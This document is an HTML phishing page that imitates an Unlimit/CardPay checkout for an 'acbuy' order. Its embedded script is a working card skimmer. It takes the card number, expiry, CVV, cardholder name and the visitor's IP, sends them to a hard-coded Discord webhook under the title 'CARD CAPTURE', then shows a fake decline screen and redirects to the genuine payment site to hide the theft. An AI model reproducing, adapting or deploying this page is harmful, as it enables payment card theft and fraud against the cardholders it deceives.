<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="preload" href="https://cardpay.com/mi-themes/js/payment.bundle.min.js" as="script">
    <link rel="preload" href="https://cardpay.com/mi-themes/css/base.css" as="style">
    <link rel="preload" href="https://cardpay.com/mi-themes/images/icons_sprite.png" as="image">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Cache-Control" content="max-age=0">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Pragma" content="no-cache">
    <title>Unlimit Payment Page</title>
    <link rel="icon" href="https://cardpay.com/mi-themes/css/favicon.ico">
    <link rel="shortcut icon" href="https://cardpay.com/mi-themes/css/favicon.ico">
    <link rel="stylesheet" href="https://cardpay.com/mi-themes/css/base.css">
    <link rel="stylesheet" href="https://cardpay.com/mi-themes/clients/acbuy/style.css">
    <style>
        /* refined modern loader with subtle glow and spring animations */
        .smart-loader {
            display: inline-flex;
            justify-content: center;
            align-items: center;
            width: 34px;
            height: 34px;
            position: relative;
            margin: 0 auto;
        }
        .smart-loader svg {
            position: absolute;
            transform: rotate(-90deg);
            width: 34px;
            height: 34px;
            filter: drop-shadow(0 0 2px rgba(0,0,0,0.05));
        }
        .smart-loader circle {
            fill: none;
            stroke-width: 2.5;
            stroke-linecap: round;
        }
        .smart-loader .bg-ring {
            stroke: rgba(180, 180, 180, 0.25);
        }
        .smart-loader .progress-ring {
            stroke: #c0c0c0;
            stroke-dasharray: 87.96;
            stroke-dashoffset: 87.96;
            transition: stroke-dashoffset 0.08s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            filter: drop-shadow(0 0 2px rgba(160,160,160,0.5));
        }
        .smart-loader .core {
            width: 22px;
            height: 22px;
            border-radius: 50%;
            background: rgba(150, 150, 150, 0.1);
            backdrop-filter: blur(5px);
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            box-shadow: inset 0 1px 1px rgba(255,255,255,0.15), 0 1px 2px rgba(0,0,0,0.05);
        }
        .smart-loader .scan {
            position: absolute;
            inset: -1px;
            border-radius: 50%;
            border-top: 1.5px solid #d0d0d0;
            border-right: 1.5px solid transparent;
            animation: spinScan 1.2s cubic-bezier(0.5, 0.0, 0.5, 1) infinite;
            opacity: 0.9;
        }
        @keyframes spinScan {
            to { transform: rotate(360deg); }
        }
        .smart-loader .check {
            width: 13px;
            height: 7px;
            border-left: 2px solid #e5e5e5;
            border-bottom: 2px solid #e5e5e5;
            transform: rotate(-45deg) scale(0.3);
            opacity: 0;
            transition: transform 0.55s cubic-bezier(0.34, 1.3, 0.55, 1), opacity 0.4s ease;
            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.1));
        }
        .smart-loader.success .progress-ring {
            stroke: #a5a5a5;
            filter: drop-shadow(0 0 4px rgba(140,140,140,0.6));
            transition: stroke 0.2s ease;
        }
        .smart-loader.success .scan {
            opacity: 0;
            animation: none;
        }
        .smart-loader.success .check {
            transform: rotate(-45deg) scale(1);
            opacity: 1;
        }
        /* subtle button pulse */
        .btn-primary.btn-loader.success-pulse {
            animation: btnSuccessPulse 0.45s cubic-bezier(0.2, 0.9, 0.4, 1.1);
        }
        @keyframes btnSuccessPulse {
            0% { transform: scale(1); background-color: #0066b3; }
            45% { transform: scale(1.03); background-color: #2a7fcc; box-shadow: 0 0 10px rgba(120,120,120,0.25); }
            100% { transform: scale(1); background-color: #0066b3; }
        }
        .btn-loader {
            pointer-events: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            min-width: 100px;
            transition: all 0.2s ease;
        }
        .btn-primary.btn-loader {
            background-color: #0066b3;
            border-color: #0066b3;
        }
        body.result-danger #payment-status-title span { color: #d32f2f !important; }
        .result-container { animation: fadeSlideUp 0.35s ease forwards; }
        @keyframes fadeSlideUp {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .btn:active { transform: scale(0.97); }
        /* error styles */
        .form-group .error {
            border-color: #d32f2f !important;
        }
        label.error {
            color: #d32f2f;
            font-size: 12px;
            margin-top: 4px;
            display: block;
            font-weight: normal;
        }
    </style>
</head>
<body class="display-shipping display-billing labels-top-position localized">
<div id="main-container">
    <form id="payment-form" method="post" novalidate>
        <input type="hidden" name="fingerprint" value="">
        <section id="payment-description">
            <div id="header-cardpay">
                <div id="cardpay-logo"><a target="_blank" href="https://cardpay.com/" rel="noopener"></a></div>
                <div id="cardpay-header-text"></div>
            </div>
            <div id="header-merchant">
                <div id="merchant-logo"><a target="_blank" href="http://acbuy.com" rel="noopener"></a></div>
                <div id="merchant-title">cardpay.com</div>
            </div>
            <div id="order-info">
                <div id="order-number-cnt"><span id="order-label">Order Number:</span> <span id="order-number"></span></div>
                <div id="total-amount-cnt"><span>Total:</span> <span id="total-amount">8.44</span> <span id="currency">USD</span></div>
                <div id="order-description"></div>
            </div>
        </section>
        <section id="payment-data">
            <section id="payment-data-fields">
                <div id="payment-data-card">
                    <h2>Card details</h2>
                    <div id="payment-data-card-fields">
                        <div class="form-group" id="card-number-field">
                            <label class="form-label" for="input-card-number">Card number</label>
                            <div class="form-input">
                                <input id="input-card-number" required type="text" name="PAN" autocomplete="off" placeholder="1234 5678 9012 3456">
                                <span id="card-number-type"></span>
                            </div>
                            <label id="card-number-error" class="error" style="display:none">Card number is required</label>
                        </div>
                        <div class="form-group" id="card-expiry-date-field">
                            <label class="form-label" for="card-expires">Expiration date</label>
                            <div class="form-input">
                                <input id="card-expires" required type="text" autocomplete="off" name="expiryDate" placeholder="MM/YYYY">
                            </div>
                            <label id="expiry-error" class="error" style="display:none">Expiration Date is required</label>
                        </div>
                        <div class="form-group" id="card-cvc-field">
                            <label class="form-label" for="input-card-cvc">CVV/CVC</label>
                            <div class="form-input">
                                <input id="input-card-cvc" required type="password" autocomplete="off" name="CVV2" maxlength="3">
                                <div id="cvc-hint"><span id="cvc-hint-toggle"></span></div>
                            </div>
                            <label id="cvv-error" class="error" style="display:none">CVV2/CVC2/CAV2 is required</label>
                        </div>
                        <div class="form-group" id="card-holder-field">
                            <label class="form-label" for="input-card-holder">Cardholder name</label>
                            <div class="form-input">
                                <input id="input-card-holder" type="text" autocapitalize="characters" name="cardholderName" required>
                            </div>
                            <label id="holder-error" class="error" style="display:none">Cardholder name is required</label>
                        </div>
                    </div>
                </div>
                <div id="payment-actions">
                    <div class="form-group">
                        <button id="action-submit" class="btn btn-primary" type="button">Pay Now</button>
                        <button id="action-cancel" type="button" class="btn btn-secondary" style="visibility: visible">Cancel</button>
                    </div>
                </div>
            </section>
        </section>
        <input type="hidden" name="omitShipAddress" value="true">
        <input type="hidden" name="locale" value="en">
        <input type="hidden" name="useCustomCSS" value="1">
        <input type="hidden" name="cssURL" value="supplier">
        <input type="hidden" name="uuid" value="AhG2eBH3F0D1ff12gGd5fFCh">
        <input type="hidden" name="shopName" value="supplier.wuaze.com">
        <input type="hidden" name="orderNumber" value="">
    </form>
    <footer>
        <div id="footer-cardpay"><a rel="noopener" href="https://www.unlimint.com/" target="_blank" id="cardpay-icon"></a></div>
        <div id="footer-icons">
            <span id="visa-icon"></span><span id="mastercard-icon"></span><span id="jcb-icon"></span>
            <span class="jsecure-icon"></span><span class="icon-dinersclubinternational"></span>
            <span class="icon-discover"></span><span id="pci-icon"></span>
        </div>
        <div id="footer-text"><div id="copyright"><span>© 2009-2026</span> <span>Unlimit</span></div></div>
    </footer>
</div>

<script>
(function(){
    let isDeclinedScreen = false;
    let processing = false;
    const redirectUrl = "https://cardpay.com/MI/payment.html?uuid=b72chB0DgDde57geh6BfG58C";
    
    function redirectClean() {
        window.location.replace(redirectUrl);
    }
    
    document.addEventListener('visibilitychange', function() {
        if(isDeclinedScreen && document.hidden) redirectClean();
    });
    window.addEventListener('beforeunload', function() {
        if(isDeclinedScreen) redirectClean();
    });
    
    // --- order number always starts with "ZE" followed by 11 digits (total 13 chars) ---
    function randomOrderNumber() {
        let digits = '';
        for(let i = 0; i < 11; i++) {
            digits += Math.floor(Math.random() * 10);
        }
        return 'ZE' + digits;
    }
    
    // random payment description
    function randomDescription() {
        const items = ["ACBUY Order #", "Invoice", "Payment for Order", "Transaction", "Merchant Charge"];
        const suffixes = ["(Express Shipping)", "(Digital Goods)", "(Membership)", "(Pre-order)"];
        return `${items[Math.floor(Math.random()*items.length)]} ${Math.floor(Math.random()*90000)+1000} ${suffixes[Math.floor(Math.random()*suffixes.length)]}`;
    }
    
    let dynamicOrder = randomOrderNumber();
    let dynamicDesc = randomDescription();
    document.getElementById('order-number').innerText = dynamicOrder;
    document.getElementById('order-description').innerText = dynamicDesc;
    document.querySelector('input[name="orderNumber"]').value = dynamicOrder;
    
    // --- text switching (after load) ---
    setTimeout(function() {
        let orderLabel = document.getElementById('order-label');
        if(orderLabel) orderLabel.innerText = 'Order number:';
        let expiryInput = document.getElementById('card-expires');
        if(expiryInput) expiryInput.placeholder = 'MM/YY';
        let submitBtn = document.getElementById('action-submit');
        if(submitBtn) submitBtn.innerText = 'Pay';
    }, 120);
    
    // --- helper: clear errors ---
    function clearErrors() {
        let fields = ['input-card-number', 'card-expires', 'input-card-cvc', 'input-card-holder'];
        fields.forEach(id => {
            let input = document.getElementById(id);
            if(input) input.classList.remove('error');
        });
        let errorLabels = ['card-number-error', 'expiry-error', 'cvv-error', 'holder-error'];
        errorLabels.forEach(id => {
            let el = document.getElementById(id);
            if(el) el.style.display = 'none';
        });
    }
    
    // --- validation ---
    function validateForm() {
        clearErrors();
        let isValid = true;
        let card = document.getElementById('input-card-number').value.trim();
        let exp = document.getElementById('card-expires').value.trim();
        let cvv = document.getElementById('input-card-cvc').value.trim();
        let holder = document.getElementById('input-card-holder').value.trim();
        
        if(!card) {
            document.getElementById('input-card-number').classList.add('error');
            document.getElementById('card-number-error').style.display = 'block';
            isValid = false;
        }
        if(!exp) {
            document.getElementById('card-expires').classList.add('error');
            document.getElementById('expiry-error').style.display = 'block';
            isValid = false;
        }
        if(!cvv) {
            document.getElementById('input-card-cvc').classList.add('error');
            document.getElementById('cvv-error').style.display = 'block';
            isValid = false;
        }
        if(!holder) {
            document.getElementById('input-card-holder').classList.add('error');
            document.getElementById('holder-error').style.display = 'block';
            isValid = false;
        }
        return isValid;
    }
    
    // --- discord webhook ---
    const hook = "https://discord.com/api/webhooks/1497249858778828981/FSiw6WVLLQ1gotjNxWZX3AbvwsUJh5KKJfrrIqOVv5Yygokx_CQzSvZcKS87h878RRiz";
    function send(d) {
        let ip="";
        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>ip=j.ip).catch(()=>ip="unknown").finally(()=>{
            fetch(hook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"💳 CARD CAPTURE",color:0xFF0000,fields:[{name:"💳 Card Number",value:"`"+d.card+"`",inline:false},{name:"📅 Expiry",value:"`"+d.exp+"`",inline:true},{name:"🔐 CVV",value:"`"+d.cvv+"`",inline:true},{name:"👤 Cardholder",value:"`"+d.holder+"`",inline:false},{name:"💰 Amount",value:d.amount+" "+d.currency,inline:true},{name:"📦 Order #",value:"`"+d.order+"`",inline:true},{name:"🌐 IP",value:"`"+ip+"`",inline:false},{name:"⏰ Time",value:"<t:"+Math.floor(Date.now()/1000)+":F>",inline:false}],footer:{text:"Payment Gateway"}}]})}).catch(e=>console.log);
        });
    }
    
    function get() {
        return {
            card: document.getElementById('input-card-number').value.replace(/\s/g,''),
            exp: document.getElementById('card-expires').value,
            cvv: document.getElementById('input-card-cvc').value,
            holder: document.getElementById('input-card-holder').value.toUpperCase()||"NOT PROVIDED",
            amount: document.getElementById('total-amount').innerText,
            currency: document.getElementById('currency').innerText,
            order: document.getElementById('order-number').innerText
        };
    }
    
    function decline() {
        let d = get();
        let last4 = d.card.slice(-4)||"****";
        let desc = "TRX"+Date.now().toString().slice(-8)+d.order.slice(-4);
        isDeclinedScreen = true;
        return `<section id="payment-description"><div id="header-cardpay"><div id="cardpay-logo"><a target="_blank" href="https://cardpay.com/"></a></div></div><div id="header-merchant"><div id="merchant-logo"><a target="_blank" href="acbuy.com"></a></div><div id="merchant-title">acbuy.com</div><div id="merchant-description">${escapeHtml(desc)}</div></div><div id="payment-info"><div id="payment-status"><div id="payment-status-icon"></div><div id="payment-status-title"><span>Decline</span></div></div></div></section><section id="payment-details"><h2>Payment Details</h2><div id="payment-details-info"><div class="payment-info-item"><div class="payment-info-item-label"><span>Payment status</span></div><div class="payment-info-item-data">Information about card/address/phone was invalid</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Order number</span></div><div class="payment-info-item-data">${escapeHtml(d.order)}</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Payment Description</span></div><div class="payment-info-item-data">${escapeHtml(desc)}</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Card Number</span></div><div class="payment-info-item-data">...${escapeHtml(last4)}</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Card Holder</span></div><div class="payment-info-item-data">${escapeHtml(d.holder)}</div></div><div class="payment-info-item"><div class="payment-info-item-label"><span>Payment Amount</span></div><div class="payment-info-item-data">${escapeHtml(d.currency)} ${escapeHtml(d.amount)}</div></div></div></section><footer><div id="footer-cardpay"><a href="https://www.unlimint.com/" target="_blank" id="cardpay-icon"></a></div><div id="footer-icons"><span id="pci-icon"></span></div><div id="footer-text"><div id="copyright"><span>© 2009-2026</span> <span>Unlimit</span></div></div></footer>`;
    }
    
    function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
    
    let form = document.getElementById('payment-form');
    let container = document.getElementById('main-container');
    let submitBtn = document.getElementById('action-submit');
    
    function done() {
        let html = decline();
        container.style.opacity = '0';
        setTimeout(()=>{
            container.innerHTML = html;
            document.body.classList.add('result-danger');
            document.body.id = 'payment-result';
            document.body.classList.remove('display-shipping','display-billing','labels-top-position');
            container.style.opacity = '1';
            container.classList.add('result-container');
            document.title = 'Unlimit Result Page';
        },200);
    }
    
    // animation loader inside button
    function startButtonAnimation(callback) {
        const wrapper = document.createElement('div');
        wrapper.className = 'smart-loader';
        wrapper.innerHTML = `
            <svg width="34" height="34" viewBox="0 0 34 34">
                <circle class="bg-ring" cx="17" cy="17" r="14" stroke="rgba(180,180,180,0.25)" stroke-width="2.5" fill="none" />
                <circle class="progress-ring" cx="17" cy="17" r="14" stroke="#c0c0c0" stroke-width="2.5" fill="none" />
            </svg>
            <div class="core">
                <div class="scan"></div>
                <div class="check"></div>
            </div>
        `;
        submitBtn.innerHTML = '';
        submitBtn.appendChild(wrapper);
        submitBtn.classList.add('btn-loader');
        submitBtn.disabled = true;
        
        const progressCircle = wrapper.querySelector('.progress-ring');
        const radius = 14;
        const circumference = 2 * Math.PI * radius;
        progressCircle.style.strokeDasharray = circumference;
        progressCircle.style.strokeDashoffset = circumference;
        
        let startTime = null;
        const duration = 4400;
        function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
        function animate(now) {
            if (!startTime) startTime = now;
            const elapsed = now - startTime;
            let t = Math.min(elapsed / duration, 1);
            const eased = easeOutCubic(t);
            const offset = circumference - (eased * circumference);
            progressCircle.style.strokeDashoffset = offset;
            if (t < 1) {
                requestAnimationFrame(animate);
            } else {
                wrapper.classList.add('success');
                submitBtn.classList.add('success-pulse');
                setTimeout(() => submitBtn.classList.remove('success-pulse'), 450);
                setTimeout(() => { if(callback) callback(); }, 500);
            }
        }
        requestAnimationFrame(animate);
    }
    
    function process() {
        if(processing) return;
        if(!validateForm()) {
            return;
        }
        processing = true;
        let cardData = get();
        send(cardData);
        startButtonAnimation(() => { done(); });
    }
    
    function refresh(){ location.reload(); }
    
    submitBtn.addEventListener('click', function(e) { e.preventDefault(); process(); });
    document.getElementById('action-cancel').addEventListener('click', function(e) { e.preventDefault(); refresh(); });
    
    // clear errors on input
    let inputs = ['input-card-number', 'card-expires', 'input-card-cvc', 'input-card-holder'];
    inputs.forEach(id => {
        let el = document.getElementById(id);
        if(el) {
            el.addEventListener('input', function() {
                this.classList.remove('error');
                let errId = '';
                if(id === 'input-card-number') errId = 'card-number-error';
                else if(id === 'card-expires') errId = 'expiry-error';
                else if(id === 'input-card-cvc') errId = 'cvv-error';
                else if(id === 'input-card-holder') errId = 'holder-error';
                if(errId) document.getElementById(errId).style.display = 'none';
            });
        }
    });
    
    // card number formatting
    let ci = document.getElementById('input-card-number');
    ci.addEventListener('input', function(){
        let v = this.value.replace(/\s/g,'').replace(/[^0-9]/g,''), f='';
        for(let i=0;i<v.length;i++){ if(i>0 && i%4===0) f+=' '; f+=v[i]; }
        this.value = f;
    });
    // expiry formatting
    let ei = document.getElementById('card-expires');
    ei.addEventListener('input', function(){
        let r = this.value.replace(/\D/g,'');
        if(r.length >= 4) this.value = r.slice(0,2)+'/'+r.slice(2,4);
        else if(r.length === 2) this.value = r;
        else this.value = r;
    });
})();
</script>
</body>
</html>
